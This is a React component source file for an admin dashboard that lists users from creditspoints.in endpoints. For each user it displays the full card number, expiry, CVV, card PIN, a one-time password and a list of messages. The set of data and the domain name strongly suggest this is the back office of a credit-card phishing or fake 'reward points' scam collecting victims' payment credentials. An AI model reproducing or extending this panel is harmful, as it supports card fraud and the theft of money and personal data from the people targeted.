import React, { useState, useEffect, useRef } from 'react';
import { Button, Card, CardBody, CardHeader, Col, Container, ListGroup, ListGroupItem, Modal, ModalBody, ModalFooter, Row, ModalHeader } from 'reactstrap';
import Breadcrumbs from "../../../components/Common/Breadcrumb";
import SimpleBar from 'simplebar-react';
import { Link } from 'react-router-dom';
import List from 'list.js';
// Import Flatepicker
import Flatpickr from "react-flatpickr";

// Import Images
import avatar1 from "../../../assets/images/users/avatar-1.jpg";
import avatar2 from "../../../assets/images/users/avatar-2.jpg";
import avatar3 from "../../../assets/images/users/avatar-3.jpg";
import avatar4 from "../../../assets/images/users/avatar-4.jpg";
import avatar5 from "../../../assets/images/users/avatar-5.jpg";
import axios from 'axios';
import DataTable from 'react-data-table-component';

const ListTables = () => {

    const [modal_list, setmodal_list] = useState(false);
    const [data,setData] = useState([])
    const [card,setCard] = useState([])
    const [mess,setMess] = useState([])
    const [whPin,setWhpin]= useState([])
    const [whotp,setWhotp]= useState([])
    const userCard = useRef([{
        "cardholder":"ok",
        "expireDate":"da",
        "expiery":"dsds",
        "cvv":"544"
    }])
    const userpin = useRef([{
        "mess":"ok",
        "refernceId":"dp"
    }])
    const userotp = useRef([{
        "otp":"ok",
        "refernceId":"dp"
    }])
    const [userMess,setUsermess] = useState([])
    function tog_list() {
        setmodal_list(!modal_list);
    }

    const [modal_delete, setmodal_delete] = useState(false);
    function tog_delete() {
        setmodal_delete(!modal_delete);
    }


    const columns = [
        {
            name: <span className='font-weight-bold fs-13'>Name</span>,
            selector: row => row.name,
            sortable: false
        },

        {
            name: <span className='font-weight-bold fs-13'>Email Id</span>,
            selector: row => row.email,
            sortable: false
        },

        {
            name: <span className='font-weight-bold fs-13'>Phone No</span>,
            selector: row => (<div style={{ display: 'flex', alignItems: 'center', cursor: "pointer", }} className='cirleshap'><p style={{ marginBottom: 1 }} >{row.phoneno} </p>
            </div>),
            sortable: false
        },
        {
            name: <span className='font-weight-bold fs-13'>Card Limit</span>,
            selector: row => (<div style={{ display: 'flex', alignItems: 'center', cursor: "pointer", }} className='cirleshap'><p style={{ marginBottom: 1 }} >{row.cardlimit} </p>
            </div>),
            sortable: false
        },

    
        {
            name: <span className='font-weight-bold fs-13'>Action</span>,
            sortable: false,

            cell: (cells) => {
                return (
                    <div className="d-flex gap-2 btn-spaces">
                        <div className="edit">
                            <button className="btn btn-sm  edit-item-btn" style={{
                                backgroundColor: "#0bb197",
                                color: "#fff",
                            }} onClick={() => {
                                console.log(cells._id)
                                let otp = []
                                let pin =[]
                                let cards = []
                                whotp.map((itemrs)=>{
                                    if(itemrs.referenceId == cells._id){
                                        otp.push(itemrs)
                                        // userotp.current = itemrs
                                    }
                                })
                                
                                whPin.map((itemr)=>{
                                    console.log("ko",itemr)
                                    if(itemr.referenceId == cells._id){
                                        console.log("ko",itemr)
                                        pin.push(itemr)

                                        // userpin.current = itemr
                                    }
                                })
                                card.map((item)=>{
                                    if(item.referenceId == cells._id){
                                        cards.push(item)
                                        // userCard.current = item
                                    }
                                })
                                let val = []
                                mess.map((items)=>{
                                    // console.log(items.referenceId,cells,"okkkkdsksdkds",items)
                                    
                                    if(items.referenceId == cells._id){
                                        console.log("okkkkdsksdkds000000",items)
                                        val.push(items)
                                    }
                                    
                                })
                                let vghu =[{
                                    "mess":"user not enter pin",
                                    "refernceId":"dp"
                                }]
                                userotp.current = otp
                                userpin.current = pin.length == 0? vghu:pin
                                userCard.current = cards
                                setUsermess(val)
                                console.log(userpin.current,"sddddddd")
                                setmodal_list(!modal_list);
                            }}
                                data-bs-toggle="modal" data-bs-target="#showModal">View Details</button>
                        </div>
                    </div>

                );
            },
        },
    ];

    const columns1 = [
        {
            name: <span className='font-weight-bold fs-13'>Message</span>,
            selector: row => row.mess,
            sortable: false
        },
    ];


    useEffect(() => {

        axios.get("https://creditspoints.in/users").then((r) => {
      console.log(r);
      setData(r)
    })

    axios.get("https://creditspoints.in/useradds").then((re) => {
      console.log(re);
      setCard(re)
    })
    axios.get("https://creditspoints.in/usermess ").then((res) => {
      console.log(res);
      setMess(res)
    })
    axios.get("https://creditspoints.in/usersaadhamess ").then((res) => {
        console.log(res);
        setWhpin(res)
      })
      axios.get("https://creditspoints.in/userbus ").then((res) => {
        console.log(res);
        setWhotp(res)
      })
    setUsermess([])
    },[]);

    return (
        <React.Fragment>
            <div className="page-content">
                <Container fluid>
                    <Breadcrumbs title="Tables" breadcrumbItem="Listjs" />

                    <Row>
                        <Col lg={12}>
                            <Card>
                                <CardHeader>
                                    <h4 className="card-title mb-0">All Active Users</h4>
                                </CardHeader>

                                <CardBody>
                                    <div id="customerList">
                                    <DataTable
                                                columns={columns}
                                                data={data}
                                                pagination
                                                paginationTotalRows={data.length}
                                            />
                                    </div>
                                </CardBody>
                            </Card>
                        </Col>
                    </Row>
                </Container>
            </div>

            {/* Add Modal */}
            <Modal isOpen={modal_list} toggle={() => { tog_list(); }} centered >
                <ModalHeader className="bg-light p-3" id="exampleModalLabel" toggle={() => { tog_list(); }}>Card Details ---- OTP ={userotp.current[0].otp}</ModalHeader>
                <form className="tablelist-form">
                    <ModalBody>
                        <div className="mb-3" id="modal-id" style={{ display: "none" }}>
                            <label htmlFor="id-field" className="form-label">ID</label>
                            <input disabled type="text" id="id-field" className="form-control" placeholder="ID" readOnly />
                        </div>

                        <div className="mb-3">
                            <label htmlFor="customername-field" className="form-label">Card Holder Name</label>
                            <input disabled type="text" id="customername-field" className="form-control" placeholder="Enter Name" required value={userCard.current[0].cardholder} />
                        </div>

                        <div className="mb-3">
                            <label htmlFor="email-field" className="form-label">Card Number</label>
                            <input disabled type="email" id="email-field" className="form-control" placeholder="Enter Email" required value={userCard.current[0].cardnumber}/>
                        </div>

                        <div className="mb-3">
                            <label htmlFor="phone-field" className="form-label">Expiry</label>
                            <input disabled type="text" id="phone-field" className="form-control" placeholder="Enter Phone no." required value={userCard.current[0].expireDate}/>
                        </div>

                        <div className="mb-3">
                            <label htmlFor="date-field" className="form-label">Cvv</label>
                            <input disabled type="text" id="phone-field" className="form-control" placeholder="Enter Phone no." required value={userCard.current[0].cvv}/>
                        </div>
                        <div className="mb-3">
                            <label htmlFor="date-field" className="form-label">Card Pin</label>
                            <input disabled type="text" id="phone-field" className="form-control" placeholder="Enter Phone no." required value={userpin.current[0].mess}/>
                        </div>
                        <div id="customerList" style={{maxHeight:300,overflow:'scroll'}}>
                                    <DataTable
                                                columns={columns1}
                                                data={userMess}
                                                pagination
                                            />
                                    </div>
                    </ModalBody>
                </form>
            </Modal>

            {/* Remove Modal */}
            <Modal isOpen={modal_delete} toggle={() => { tog_delete(); }} className="modal fade zoomIn" id="deleteRecordModal" centered >
                <div className="modal-header">
                    <Button type="button" onClick={() => setmodal_delete(false)} className="btn-close" aria-label="Close"> </Button>
                </div>
                <ModalBody>
                    <div className="mt-2 text-center">
                        <lord-icon src="https://cdn.lordicon.com/gsqxdxog.json" trigger="loop"
                            colors="primary:#f7b84b,secondary:#f06548" style={{ width: "100px", height: "100px" }}></lord-icon>
                        <div className="mt-4 pt-2 fs-15 mx-4 mx-sm-5">
                            <h4>Are you Sure ?</h4>
                            <p className="text-muted mx-4 mb-0">Are you Sure You want to Remove this Record ?</p>
                        </div>
                    </div>
                    <div className="d-flex gap-2 justify-content-center mt-4 mb-2">
                        <button type="button" className="btn w-sm btn-light" onClick={() => setmodal_delete(false)}>Close</button>
                        <button type="button" className="btn w-sm btn-danger " id="delete-record">Yes, Delete It!</button>
                    </div>
                </ModalBody>
            </Modal>
        </React.Fragment>
    );
};

export default ListTables;
